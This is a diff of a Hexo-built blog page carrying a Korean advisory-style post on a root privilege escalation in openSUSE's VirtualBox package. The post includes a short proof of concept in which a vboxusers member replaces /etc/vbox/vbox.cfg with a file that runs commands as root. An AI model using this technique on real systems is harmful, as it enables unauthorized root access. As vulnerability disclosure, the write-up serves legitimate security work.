@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      243 자
+      435 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      8
        분
     </span>
   
@@ -244,25 +244,25 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>VirtualBox for openSUSE</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>oracle사의 오픈소스 가상 머신 소프트웨어인 VirtualBox openSUSE 패키지 배포판에서 특정 계정 그룹의 유저가 root로 권한 상승이 가능한 취약점이 발견되었습니다.</p>
-<p><code>vboxusers</code> group은 VirtualBox 자동시작을 위해 도입되었으며 VirtualBox의 여러 구성 파일이 포함된  <code>/etc/vbox</code> 디렉터리에 쓰기 권한이 부여된 유저 그룹입니다. 그러나 <code>/etc/vbox</code> 디렉터리에 sticky bit 설정이 누락되어 있어 <code>vboxusers</code>에 속한 모든 유저가 해당 디렉터리의 파일을 임의로 수정할 수 있습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>oracle&#xC0AC;&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC778; VirtualBox openSUSE &#xD328;&#xD0A4;&#xC9C0; &#xBC30;&#xD3EC;&#xD310;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xACC4;&#xC815; &#xADF8;&#xB8F9;&#xC758; &#xC720;&#xC800;&#xAC00; root&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><code>vboxusers</code> group&#xC740; VirtualBox &#xC790;&#xB3D9;&#xC2DC;&#xC791;&#xC744; &#xC704;&#xD574; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC73C;&#xBA70; VirtualBox&#xC758; &#xC5EC;&#xB7EC; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C;  <code>/etc/vbox</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; &#xC720;&#xC800; &#xADF8;&#xB8F9;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>/etc/vbox</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; sticky bit &#xC124;&#xC815;&#xC774; &#xB204;&#xB77D;&#xB418;&#xC5B4; &#xC788;&#xC5B4; <code>vboxusers</code>&#xC5D0; &#xC18D;&#xD55C; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC784;&#xC758;&#xB85C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <blockquote>
-<p>sticky bit가 설정된 디렉터리에는 누구나 파일을 생성할 수 있지만 삭제 및 수정은 생성한 유저와 root만 가능합니다.</p>
+<p>sticky bit&#xAC00; &#xC124;&#xC815;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xB294; &#xB204;&#xAD6C;&#xB098; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC0AD;&#xC81C; &#xBC0F; &#xC218;&#xC815;&#xC740; &#xC0DD;&#xC131;&#xD55C; &#xC720;&#xC800;&#xC640; root&#xB9CC; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 </blockquote>
-<p>위 취약점을 악용하면  <code>vboxautostart.sh</code>, <code>vboxdrv.sh</code>및 <code>vboxweb-service.sh</code>와 같이 root 권한의 VirtualBox bash script에서 사용되는 <code>/etc/vbox/vbox.cfg</code> 파일을 수정할 수 있어 root 권한으로 현재 작업 디렉터리(CWD) 내의 제한된 명령 및 파일 실행이 가능합니다. PoC는 설명과 함께 아래에서 확인할 수 있습니다.</p>
-<pre><code class="hljs cpp"><span class="hljs-comment">//vboxusers 그룹 nobody 생성</span>
+<p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74;  <code>vboxautostart.sh</code>, <code>vboxdrv.sh</code>&#xBC0F; <code>vboxweb-service.sh</code>&#xC640; &#xAC19;&#xC774; root &#xAD8C;&#xD55C;&#xC758; VirtualBox bash script&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>/etc/vbox/vbox.cfg</code> &#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC5B4; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD604;&#xC7AC; &#xC791;&#xC5C5; &#xB514;&#xB809;&#xD130;&#xB9AC;(CWD) &#xB0B4;&#xC758; &#xC81C;&#xD55C;&#xB41C; &#xBA85;&#xB839; &#xBC0F; &#xD30C;&#xC77C; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. PoC&#xB294; &#xC124;&#xBA85;&#xACFC; &#xD568;&#xAED8; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs cpp"><span class="hljs-comment">//vboxusers &#xADF8;&#xB8F9; nobody &#xC0DD;&#xC131;</span>
 root<span class="hljs-meta"># su -g vboxusers nobody</span>
 nobody$ cd /etc/vbox
 nobody$ cp vbox.cfg vbox.cfg.<span class="hljs-keyword">new</span>
-<span class="hljs-comment">// nobody에서 기존 vbox.cfg 삭제후 임의 명령이 포함된 vbox.cfg로 대체</span>
+<span class="hljs-comment">// nobody&#xC5D0;&#xC11C; &#xAE30;&#xC874; vbox.cfg &#xC0AD;&#xC81C;&#xD6C4; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC774; &#xD3EC;&#xD568;&#xB41C; vbox.cfg&#xB85C; &#xB300;&#xCCB4;</span>
 nobody$ rm -f vbox.cfg
 nobody$ mv vbox.cfg.<span class="hljs-keyword">new</span> vbox.cfg
 nobody$ echo <span class="hljs-string">&quot;touch /root/evil&quot;</span> &gt;&gt;vbox.cfg
 nobody$ <span class="hljs-built_in">exit</span>
-<span class="hljs-comment">// vboxautostart 스크립트가 실행되면 트리거</span>
+<span class="hljs-comment">// vboxautostart &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xD2B8;&#xB9AC;&#xAC70;</span>
 root<span class="hljs-meta"># systemctl start vboxautostart.service</span>
 root<span class="hljs-meta"># ls -lh /root/evil</span>
--rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span>  <span class="hljs-number">2.</span> Mär <span class="hljs-number">12</span>:<span class="hljs-number">14</span> /root/evil</code></pre>
+-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span>  <span class="hljs-number">2.</span> M&#xE4;r <span class="hljs-number">12</span>:<span class="hljs-number">14</span> /root/evil</code></pre>
             </div>
             <hr>
             <div>
@@ -279,9 +279,9 @@ root<span class="hljs-meta"># ls -lh /root/evil</span>
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
-                  
                   <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
+                  
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                   
@@ -564,6 +564,45 @@ root<span class="hljs-meta"># ls -lh /root/evil</span>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
